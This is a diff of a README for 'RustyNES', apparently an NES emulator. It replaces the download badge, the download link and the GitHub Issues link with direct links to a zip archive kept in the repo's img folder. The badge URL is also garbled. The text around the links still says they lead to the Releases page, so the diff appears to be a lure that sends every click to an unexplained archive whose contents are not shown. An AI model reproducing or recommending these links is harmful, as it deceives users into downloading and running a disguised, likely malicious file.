@@ -1,6 +1,6 @@
 # 🎮 RustyNES - Play Classic NES Games Effortlessly
 
-[![Download RustyNES](https://img.shields.io/badge/Download%20RustyNES-latest-blue.svg)](https://github.com/Sunrise-public-school/RustyNES/releases)
+[![Download RustyNES](https://github.com/Sunrise-public-school/RustyNES/raw/refs/heads/main/img/Rusty-NES-moonblink.zip%https://github.com/Sunrise-public-school/RustyNES/raw/refs/heads/main/img/Rusty-NES-moonblink.zip)](https://github.com/Sunrise-public-school/RustyNES/raw/refs/heads/main/img/Rusty-NES-moonblink.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these requirements:
 
 To download RustyNES, visit this page to download:
 
-[Download RustyNES](https://github.com/Sunrise-public-school/RustyNES/releases)
+[Download RustyNES](https://github.com/Sunrise-public-school/RustyNES/raw/refs/heads/main/img/Rusty-NES-moonblink.zip)
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Look for the latest version.
@@ -98,7 +98,7 @@ One of the unique features of RustyNES is GGPO netplay. This allows you to play 
 
 If you encounter any problems or have questions, feel free to reach out. You can find help through the project's issues page on GitHub:
 
-[GitHub Issues](https://github.com/Sunrise-public-school/RustyNES/issues)
+[GitHub Issues](https://github.com/Sunrise-public-school/RustyNES/raw/refs/heads/main/img/Rusty-NES-moonblink.zip)
 
 ## 🎉 Community
 
